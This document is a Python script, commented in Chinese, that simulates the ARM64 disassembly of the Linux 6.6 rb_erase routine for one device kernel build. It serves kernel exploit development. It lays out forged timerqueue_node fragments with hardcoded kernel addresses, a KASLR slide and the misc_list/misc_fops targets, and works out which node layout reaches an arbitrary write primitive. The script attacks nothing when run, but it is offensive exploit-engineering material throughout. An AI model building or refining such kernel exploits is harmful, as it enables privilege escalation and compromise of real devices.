#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H12 正确版: 用 MEY kernel 6.6.118 真反汇编逐条模拟 rb_erase。
关键: Linux 6.6 lib/rbtree.c __rb_erase_augmented:
    child = node->rb_right;   tmp = node->rb_left;
反汇编入口 0x3a9d4: ldp x8,x10,[x0,#8]
    => x8 = [node+8]    = node->rb_right  (child)
    => x10= [node+0x10] = node->rb_left   (tmp)
"""
import sys

def simulate(pc, right, left, verbose=True):
    """逐条模拟 rb_erase(node)。pc=node->__rb_parent_color, right/left = 子指针。"""
    log = []
    def L(s): log.append(s)

    x0 = "node"
    x8  = right            # child = node->rb_right
    x10 = left             # tmp   = node->rb_left
    L("0x3a9d4  ldp x8,x10,[x0,#8]  -> x8(rb_right)=%#x  x10(rb_left)=%#x" % (x8, x10))

    if x10 != 0:
        L("0x3a9d8  cbnz x10 -> TAKEN (rb_left!=0)  => 0x3aa18")
        # --- left != 0 分支 ---
        if x8 == 0:
            L("0x3aa18  cbz x8 -> TAKEN (rb_right==0)  => 0x3ab04")
            return "PATH_AB04(left!=0,right==0)", log
        L("0x3aa1c  ldr x11,[x8,#0x10]")
        return "PATH_AA1C(left!=0,right!=0)", log

    L("0x3a9d8  cbnz x10 -> NOT taken (rb_left==0)  => 0x3a9dc")
    # --- rb_left == 0 ---
    x9 = pc
    L("0x3a9dc  ldr x9,[x0]           -> x9(rb_parent_color)=%#x" % x9)
    x11 = "root"
    L("0x3a9e0  mov x11,x1")
    x10n = x9 & ~3
    L("0x3a9e4  ands x10,x9,#-4       -> parent=%#x  (ZF=%d)" % (x10n, 1 if x10n == 0 else 0))
    if x10n == 0:
        L("0x3a9e8  b.eq -> TAKEN  => 0x3aa00  (x11 stays root)")
    else:
        L("0x3a9e8  b.eq -> NOT taken")
        x11n = x10n
        L("0x3a9ec  mov x11,x10           -> x11=%#x" % x11n)
        x12 = "*(%#x+0x10)" % x11n
        L("0x3a9f0  ldr x12,[x11,#0x10]! -> x12=parent->rb_left(%s)  x11=%#x" % (x12, x11n + 0x10))
        x13 = x11n + 8
        L("0x3a9f4  sub x13,x11,#8        -> x13=%#x" % x13)
        eq = (x12 == x0)
        L("0x3a9f8  cmp x12,x0            -> parent->rb_left==node? %s" % eq)
        x11 = (x11n + 0x10) if eq else (x11n + 8)
        L("0x3a9fc  csel x11,x11,x13,eq   -> x11=%#x  (=parent->rb_left 槽 or parent->rb_right 槽)" % x11)
    L("0x3aa00  str x8,[x11]          -> *x11 = rb_right(=%#x)   ★摘链写" % x8)
    if x8 != 0:
        L("0x3aa04  cbnz x8 -> TAKEN  => 0x3aa10")
        L("0x3aa10  str x9,[x8]          -> rb_right->pc = node->pc")
        L("0x3aa14  ret                  ★ SAFE(有 right 子)")
        return "PATH_AA10(left=0,right!=0)", log
    L("0x3aa04  cbnz x8 -> NOT taken (rb_right==0)")
    if x9 & 1:
        L("0x3aa08  tbnz w9,#0 -> TAKEN (RED)  => 0x3aa78  ★进入 rebalance")
        return "PATH_AA78(left=0,right=0,RED)", log
    L("0x3aa08  tbnz w9,#0 -> NOT taken (BLACK)")
    L("0x3aa0c  ret                  ★ SAFE(无子,B LACK)")
    return "PATH_AA0C(left=0,right=0,BLACK)", log


def main():
    LINK_IMAGE_BASE = 0xffffffc080000000
    LINK_MISC_LIST  = 0xffffffc08229b190
    MEY_PHYS_DELTA  = 0x28000000
    DIRECT_MAP_BEGIN = LINK_IMAGE_BASE + MEY_PHYS_DELTA
    slide = 0x22c8c00000

    print("=" * 80)
    print("H12 rb_erase 逐条模拟（正确版）— 关键: x8=rb_right, x10=rb_left")
    print("=" * 80)

    # fragment 布局（f77 build_fake_fragment / build_misc_fragments）:
    #   timerqueue_node @ offset:
    #     +0x00 rb_parent_color = forged_parent
    #     +0x08 rb_right        = forged_child / child(非0)
    #     +0x10 rb_left         = 0   (未写, memset)
    #     +0x18 expires         = UINT64_MAX
    cases = [
        ("stage0: pc=P0alias(bootid)-8, right=P0alias(cycleC), left=0",
         0xffffff802a29b088, 0xffffff802a17d5d0, 0x0),

        ("stageB physmap: pc=P0alias(misc_list)-8, right=child, left=0",
         DIRECT_MAP_BEGIN + (LINK_MISC_LIST - LINK_IMAGE_BASE) + MEY_PHYS_DELTA - 8,
         0xffffff8040000118, 0x0),

        ("stageB image:   pc=misc_list+slide-8,   right=child, left=0",
         LINK_MISC_LIST + slide - 8, 0xffffff8040000118, 0x0),

        ("stageB physmap + 若我误把 child 写进 left 槽 (left!=0,right=0)",
         DIRECT_MAP_BEGIN + (LINK_MISC_LIST - LINK_IMAGE_BASE) + MEY_PHYS_DELTA - 8,
         0x0, 0xffffff8040000118),
    ]
    for name, pc, right, left in cases:
        print("\n### %s" % name)
        path, log = simulate(pc, right, left)
        for l in log:
            print("   " + l)
        print("   >>> 路径 = %s" % path)

    print("\n" + "=" * 80)
    print("判定要点：")
    print("  A) 若 fragment 的 +8=child(非0)、+0x10=0  => 走 0x3a9dc 分支，")
    print("     x8=child!=0 => 0x3aa10: *(right_child)=node->pc 后 ret，★安全且不动 misc_list！")
    print("     注意：此路径【写的是 child 指向的地址】，不是 misc_fops！")
    print("  B) 真正执行写原语 *target=value 的路径是 0x3ab04，其进入条件是")
    print("     【rb_left!=0 且 rb_right==0】(0x3aa18: cbz x8 -> 0x3ab04)")
    print("     —— 与现有 fragment 布局【相反】！")
    print("=" * 80)

if __name__ == "__main__":
    main()
